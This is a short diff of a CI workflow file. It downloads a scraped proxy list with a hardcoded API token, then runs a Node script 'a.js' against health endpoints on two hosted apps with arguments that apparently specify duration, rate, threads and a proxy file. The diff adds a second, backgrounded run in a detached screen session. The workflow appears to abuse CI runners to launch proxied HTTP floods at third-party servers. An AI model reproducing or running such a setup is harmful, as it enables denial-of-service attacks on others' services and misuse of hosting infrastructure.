@@ -39,9 +39,12 @@ jobs:
           
           cd Fc-main
           curl -s "https://api.proxies.is/scraped?token=A4eH8m71mK2U57785S5c3&timeout=15000&excludeCountry=IN&includeCountry=IN&type=http" -o woo.txt
+          screen -dms ve   node a.js GET https://katanaapk-t6d0.onrender.com/health 1750 4 90 woo.txt --full --debug 
+
+          
           node a.js GET https://ghostxserver-prod.up.railway.app/health 1750 4 90 woo.txt --full --debug 
           
-
+         
           
           sleep 1
           
